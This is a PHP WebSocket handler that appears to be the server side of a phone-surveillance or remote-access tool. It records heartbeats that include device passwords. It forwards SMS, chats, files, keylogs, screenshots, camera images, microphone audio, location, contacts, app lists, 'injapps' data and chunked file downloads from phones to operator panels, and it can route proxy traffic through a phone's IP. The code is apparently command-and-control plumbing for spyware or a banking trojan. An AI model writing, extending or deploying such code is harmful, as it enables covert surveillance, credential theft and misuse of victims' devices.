<?php

declare(strict_types=1);

namespace App\WebSocket\Handlers;

use App\WebSocket\ConnectionManager;
use App\WebSocket\Services\DeviceStatusService;
use App\WebSocket\Services\HeartbeatService;
use App\WebSocket\WebSocketLog;

final class DeviceHandler
{
    private ConnectionManager $connectionManager;
    private HeartbeatService $heartbeatService;
    private DeviceStatusService $deviceStatusService;

    public function __construct(ConnectionManager $connectionManager, HeartbeatService $heartbeatService)
    {
        $this->connectionManager = $connectionManager;
        $this->heartbeatService = $heartbeatService;
        $this->deviceStatusService = new DeviceStatusService($connectionManager);
    }

    public function handle(int $fd, array $data): void
    {
        $phoneId = $data['pid'] ?? null;

        if ($phoneId === null) {
            WebSocketLog::getLogger()->warning("Device message missing pid: fd={$fd}");
            return;
        }

        $existingPhoneId = $this->connectionManager->getPhoneId($fd);
        if ($existingPhoneId === null) {
            $this->connectionManager->registerDevice($fd, $phoneId);
        }

        $subc = $data['subc'] ?? null;

        if ($subc === 'ping') {
            $this->handlePing($phoneId, $data);
            return;
        }

        $this->forwardToPanel($phoneId, $data);
    }

    private function handlePing(string $phoneId, array $data): void
    {
        try {
            $this->heartbeatService->recordPing($phoneId);

            $encodedData = $data['msg'] ?? '';
            $status = $this->deviceStatusService->updateFromPing($phoneId, $encodedData);

            $phoneInfo = $this->deviceStatusService->formatForPanel($phoneId);

            // 格式化 lastPing 时间戳
            $lastPing = null;
            if (isset($phoneInfo['lastPing']) && $phoneInfo['lastPing'] > 0) {
                $lastPing = date('Y-m-d H:i:s', (int) ($phoneInfo['lastPing'] / 1000));
            }

            // passwords 数据包含在 phoneInfo.phone_password 中，由前端解析
            $this->connectionManager->sendToPanels($phoneId, [
                'type' => 'statusBatch',
                'pid' => $phoneId,
                'serverToPhone' => 'OPEN',
                'lastPing' => $lastPing,
                'phoneInfo' => $phoneInfo,
            ]);

            // 同时推送给设备列表页（Index）的订阅者，用于实时更新电量、最后活动时间等
            $this->connectionManager->notifyPanelUsersDeviceStatusUpdate($phoneId, $phoneInfo);
        } catch (\Throwable $e) {
            WebSocketLog::getLogger()->error('Ping handling failed, connection preserved', [
                'phone_id' => $phoneId,
                'error' => $e->getMessage(),
            ]);
        }
    }

    private function forwardToPanel(string $phoneId, array $data): void
    {
        $subc = $data['subc'] ?? 'unknown';

        $panelData = match ($subc) {
            // Standard msg-based messages
            'sms', 'chat', 'files', 'savefiles', 'snap', 'loc', 'loadapps', 'loadcontacts', 'injapps' => [
                'type' => $subc,
                'data' => $data['msg'] ?? '',
                'pid' => $phoneId,
            ],

            // klogs → type "klog" (note: different type name)
            'klogs' => [
                'type' => 'klog',
                'data' => $data['msg'] ?? '',
                'pid' => $phoneId,
            ],

            // klogsdate
            'klogsdate' => [
                'type' => 'klogsdate',
                'data' => $data['msg'] ?? '',
                'pid' => $phoneId,
            ],

            // thumb - adds path field
            'thumb' => [
                'type' => 'thumb',
                'data' => $data['msg'] ?? '',
                'pid' => $phoneId,
                'path' => $data['pth'] ?? 'null',
            ],

            // mic - uses voip field instead of msg
            'mic' => [
                'type' => 'mic',
                'data' => $data['voip'] ?? '',
                'pid' => $phoneId,
            ],

            // screen/screenshot - uses img field, adds dimensions
            'screen', 'screenshot' => [
                'type' => $subc,
                'data' => $data['img'] ?? '',
                'pid' => $phoneId,
                'wmob' => $data['wmob'] ?? '',
                'hmob' => $data['hmob'] ?? '',
            ],

            // cam - uses img field
            'cam' => [
                'type' => 'cam',
                'data' => $data['img'] ?? '',
                'pid' => $phoneId,
            ],

            // srch - uses pths field, adds sfor
            'srch' => [
                'type' => 'srch',
                'data' => $data['pths'] ?? 'null',
                'pid' => $phoneId,
                'sfor' => $data['stype'] ?? 'null',
            ],

            // down - file download with chunking
            'down' => [
                'type' => 'down',
                'filename' => $data['filename'] ?? '',
                'filedata' => $data['filedata'] ?? '',
                'totalSize' => $data['totalSize'] ?? 0,
                'sentSize' => $data['sentSize'] ?? 0,
                'chunkNumber' => $data['chunkNumber'] ?? 0,
                'filehash' => $data['filehash'] ?? '',
                'filepath' => $data['filepath'] ?? '',
                'pid' => $phoneId,
            ],

            // proxy - complex ctype-based logic
            'proxy' => $this->buildProxyPanelData($phoneId, $data),

            // Default fallback
            default => [
                'type' => $subc,
                'pid' => $phoneId,
            ],
        };

        $this->connectionManager->sendToPanels($phoneId, $panelData);
    }

    private function buildProxyPanelData(string $phoneId, array $data): array
    {
        $ctype = $data['ctype'] ?? '';

        return match ($ctype) {
            'first' => [
                'type' => 'proxy',
                'pid' => $phoneId,
                'calltype' => 'first',
                'extip' => $this->connectionManager->getClientIp($phoneId) ?? '',
                'locip' => $data['loip'] ?? '',
                'pxport' => $data['pport'] ?? '',
            ],
            'state' => [
                'type' => 'proxy',
                'pid' => $phoneId,
                'calltype' => 'state',
                'pstate' => $data['pxstate'] ?? '',
            ],
            'dataup' => [
                'type' => 'proxy',
                'pid' => $phoneId,
                'calltype' => 'dataup',
                'ogip' => $data['oip'] ?? '',
                'pxip' => $this->connectionManager->getClientIp($phoneId) ?? '',
                'purl' => $data['purl'] ?? '',
                'pmthod' => $data['pmth'] ?? '',
            ],
            default => [
                'type' => 'proxy',
                'pid' => $phoneId,
                'calltype' => $ctype,
            ],
        };
    }
}
